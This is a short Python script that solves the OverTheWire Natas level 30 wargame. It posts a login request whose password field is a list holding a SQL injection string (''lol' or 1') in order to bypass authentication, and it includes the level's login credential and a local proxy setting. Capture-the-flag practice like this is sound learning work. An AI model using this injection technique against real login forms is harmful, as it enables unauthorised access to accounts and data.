import requests
import urllib
import base64


# proxies = {
#  "http": "http://127.0.0.1:8099",
# }


url = "http://natas30.natas.labs.overthewire.org"
s = requests.Session()

s.proxies = {
 "http": "http://127.0.0.1:8099",
}


s.auth = ('natas30', 'wie9iexae0Daihohv8vuu3cei9wahf0e')


params={"username": "valid_username", "password": ["'lol' or 1", 2]} # here we are passing two password fileds using list.
print(s.post(url, data=params).text)

